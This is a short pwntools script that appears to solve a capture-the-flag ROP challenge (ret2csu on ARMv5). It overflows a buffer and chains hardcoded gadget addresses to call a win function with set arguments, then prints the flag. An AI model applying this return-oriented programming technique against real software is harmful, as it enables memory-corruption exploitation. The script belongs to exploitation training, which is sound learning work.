#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./ret2csu_armv5")

offset = 36
junk = b"A" * offset

pop_r3 = p32(0x10474)
ret2win = p32(0x10498)
pops = p32(0x10644)
movs = p32(0x1062c)

payload  = b""
payload += junk
payload += pop_r3 + ret2win
payload += pops + p32(0) + p32(0) + p32(0)
payload += p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)
payload += p32(0)
payload += movs

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
